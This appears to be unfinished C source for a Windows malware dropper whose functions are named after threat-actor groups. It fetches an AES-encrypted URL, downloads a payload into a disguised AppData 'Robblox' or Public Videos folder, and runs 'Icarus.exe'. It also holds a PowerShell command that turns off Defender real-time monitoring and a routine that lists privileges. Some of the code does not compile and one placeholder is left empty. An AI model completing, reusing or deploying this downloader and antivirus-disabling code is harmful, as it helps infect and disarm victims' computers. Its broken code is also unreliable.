#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winhttp.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/err.h>


/*
Saint_Bear same as in STRONTIUM
Metador true/false for Saint_Bear\\Local\\Robblox folder
main runs Icarus
Rhea file downloder
WhiteBear turns off real time protection
FIN4 check the priv level
*/

int main(){

    char *ppp = Saint_Bear();
    char *path;

    if(Metador()){
        path = "%s\\Local\\Robblox", ppp;
    }else{
        path = "C:\\Users\\Public\\Videos";
    }

    Rhea(path);

        STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Path to your executable
    char exePath[MAX_PATH];
    snprintf(exePath, MAX_PATH, "%s\\Icarus.exe", path);

    // Start the process
    CreateProcessA(
        exePath,   // Application name
        NULL,      // Command line arguments
        NULL,      // Process handle not inheritable
        NULL,      // Thread handle not inheritable
        FALSE,     // Set handle inheritance to FALSE
        0,         // No creation flags
        NULL,      // Use parent's environment block
        NULL,      // Use parent's starting directory 
        &si,       // Pointer to STARTUPINFO structure
        &pi
    );       // Pointer to PROCESS_INFORMATION structure
    

    // Wait until the process exits
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

bool Metador() {
    char *ppp = Saint_Bear();
    char *path = "%s\\Local\\Robblox", ppp;

    struct stat buffer;
    if (stat("", &buffer) == 0) {
        return true;
    } else {
        return false;
    }
}

char* Saint_Bear() {
    char* bronze_silhouette = getenv("APPDATA");
    return bronze_silhouette;
}

int Rhea(char *path) {
    char * txt= ""; // fill in when able ==================================================
    char *varstr1= Voltzite(txt);

    const wchar_t *url = L"%s", varstr1; 
    const wchar_t *out = path;

    free(varstr1);

    URL_COMPONENTS uc = {0};
    uc.dwStructSize = sizeof(uc);

    wchar_t host[256], path[1024];
    uc.lpszHostName = host;
    uc.dwHostNameLength = _countof(host);
    uc.lpszUrlPath = path;
    uc.dwUrlPathLength = _countof(path);

    WinHttpCrackUrl(url, 0, 0, &uc);

    HINTERNET hSession = WinHttpOpen(L"Downloader/1.0",  
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, uc.lpszHostName, uc.nPort, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", uc.lpszUrlPath,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);

    if(WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
       WinHttpReceiveResponse(hRequest, NULL)) {
        FILE *f = _wfopen(out, L"wb");
        DWORD bytes;
        char buffer[4096];
        while(WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytes) && bytes)
            fwrite(buffer, 1, bytes, f);
        fclose(f);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return 0;
}


char * Voltzite(const unsigned char* cipherText){
    unsigned char key[32];
    unsigned char iv[16];
    Group123(iv);
    Black_Vine(key);

    return sam(cipherText, sizeof(cipherText), key, sizeof(key), iv, sizeof(iv));
}

void Group123(unsigned char out[16]){
    unsigned char buffer[MAX_PATH] = {0};
    DWORD len = GetEnvironmentVariableA("windir", (char*)buffer, sizeof(buffer));

    // Fill output with zeros first
    for (int i = 0; i < 16; i++)
        out[i] = 0x00;

    if (len == 0 || len >= sizeof(buffer))
        return;

    size_t n = (len < 16) ? len : 16;
    for (size_t i = 0; i < n; i++)
        out[i] = buffer[i];
}

void Black_Vine(unsigned char out[32]){

    unsigned char buffer[MAX_PATH] = {0};
    DWORD len = GetEnvironmentVariableA("COMSPEC", (char*)buffer, sizeof(buffer));

    // Fill output with zeros first
    for (int i = 0; i < 32; i++)
        out[i] = 0x00;

    if (len == 0 || len >= sizeof(buffer))
        return;

    size_t n = (len < 32) ? len : 32;
    for (size_t i = 0; i < n; i++)
        out[i] = buffer[i];
}

char* Sam(const unsigned char* cipherText, int cipherTextLen, const unsigned char* Key, int KeyLen, const unsigned char* IV, int IVLen) {
    if (cipherText == NULL || cipherTextLen <= 0) {
        return NULL;
    }
    if (Key == NULL || KeyLen <= 0) {
        return NULL;
    }
    if (IV == NULL || IVLen <= 0) {
        return NULL;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        return NULL;
    }

    // Initialize decryption operation with AES CBC mode
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, Key, IV) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }

    unsigned char* plaintext = malloc(cipherTextLen + AES_BLOCK_SIZE);
    if (!plaintext) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }

    int len = 0;
    int plaintext_len = 0;

    if (EVP_DecryptUpdate(ctx, plaintext, &len, cipherText, cipherTextLen) != 1) {
        free(plaintext);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }
    plaintext_len = len;

    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
        free(plaintext);
        EVP_CIPHER_CTX_free(ctx);
        return NULL;
    }
    plaintext_len += len;

    EVP_CIPHER_CTX_free(ctx);

    // Null-terminate the plaintext string
    plaintext[plaintext_len] = '\0';

    return (char*)plaintext;
}



//=================================================== make downloader and runner
int WhiteBear(){
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;

    // The command you want to run
    LPCSTR cmd = "powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true";

    CreateProcessA(
        NULL,
        (LPSTR)cmd,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    );

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    

    return 0;
}

char** FIN4(DWORD* outCount){
     *outCount = 0;    // default return count
    HANDLE token;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
        return NULL;

    DWORD len = 0;
    GetTokenInformation(token, TokenPrivileges, NULL, 0, &len);

    TOKEN_PRIVILEGES* priv = (TOKEN_PRIVILEGES*)malloc(len);
    if (!priv) {
        CloseHandle(token);
        return NULL;
    }

    if (!GetTokenInformation(token, TokenPrivileges, priv, len, &len)) {
        free(priv);
        CloseHandle(token);
        return NULL;
    }

    DWORD count = priv->PrivilegeCount;
    char** list = (char**)malloc(count * sizeof(char*));
    if (!list) {
        free(priv);
        CloseHandle(token);
        return NULL;
    }

    for (DWORD i = 0; i < count; i++)
    {
        LUID_AND_ATTRIBUTES la = priv->Privileges[i];

        char name[256];
        DWORD nameLen = sizeof(name);

        if (!LookupPrivilegeNameA(NULL, &la.Luid, name, &nameLen)) {
            list[i] = _strdup("UNKNOWN_PRIVILEGE");
        } else {
            // Allocate "Name : ENABLED"/"DISABLED"
            char enabledText[16];
            snprintf(enabledText, sizeof(enabledText),
                     (la.Attributes & SE_PRIVILEGE_ENABLED) ? "ENABLED" : "DISABLED");

            size_t totalLen = strlen(name) + strlen(enabledText) + 5;
            list[i] = (char*)malloc(totalLen);
            snprintf(list[i], totalLen, "%s : %s", name, enabledText);
        }
    }

    free(priv);
    CloseHandle(token);

    *outCount = count;
    return list;
}